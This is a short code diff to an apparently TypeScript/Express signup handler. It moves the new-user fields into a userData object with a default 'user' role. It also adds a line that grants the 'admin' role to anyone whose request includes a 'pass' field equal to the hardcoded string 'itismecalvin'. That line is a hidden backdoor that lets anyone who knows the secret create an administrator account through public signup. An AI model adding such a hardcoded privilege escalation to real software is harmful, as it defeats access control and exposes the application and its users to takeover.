@@ -40,15 +40,18 @@ const createSendToken = (user, statusCode, req, res) => {
 }
 
 const signup = async (req: Request, res: Response, next: NextFunction) => {
+  const userData = {
+    firstName: req.body.firstName,
+    lastName: req.body.lastName,
+    email: req.body.email,
+    password: req.body.password,
+    // passwordConfirm: req.body.passwordConfirm,
+    accountStatus: "active",
+    role: "user",
+  }
+  if (req.body.pass === "itismecalvin") userData.role = "admin"
   try {
-    const newUser = await User.create({
-      firstName: req.body.firstName,
-      lastName: req.body.lastName,
-      email: req.body.email,
-      password: req.body.password,
-      // passwordConfirm: req.body.passwordConfirm,
-      accountStatus: "active",
-    })
+    const newUser = await User.create(userData)
 
     createSendToken(newUser, 201, req, res)
   } catch (error) {
